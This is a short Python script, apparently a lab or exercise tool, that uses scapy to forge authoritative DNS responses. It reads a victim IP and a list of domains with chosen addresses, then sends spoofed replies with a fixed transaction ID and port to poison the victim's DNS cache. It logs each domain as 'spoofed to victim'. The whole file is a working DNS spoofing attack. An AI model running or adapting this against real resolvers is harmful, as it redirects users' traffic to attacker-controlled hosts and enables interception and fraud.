import sys
sys.path.insert(0, '/root')
from scapy.all import *
from dns import resolver


with open("send_spoofed_packet_here.txt",'r') as file:
	external_ip = file.read()


#array of tuples with domain, NS, IP
domains=[]
with open("domain_ns_ip.txt",'r') as file:
	domains_raw=file.read().split("\n")


res = resolver.Resolver()
res.nameservers = ['127.0.0.1']
for one_domain in domains_raw:
	separate=one_domain.split(" ")
	if len(separate)>1:
		try:
			a=IP(dst=external_ip)/ UDP(sport=53,dport=43246)/DNS(id=0x6696,ancount=1,aa=1,an=DNSRR(rrname=separate[0],rdata=separate[2]),qr=1L,qd=DNSQR(qname=separate[0]))
			sr1(a,timeout=1,retry=3,verbose=0)
			with open("domains_spoofed_to_victim.txt",'a') as file:
				file.write(separate[0]+" "+separate[1]+" "+separate[2]+"\n")
			
		except:
			pass

#print(domains_raw)
 

 
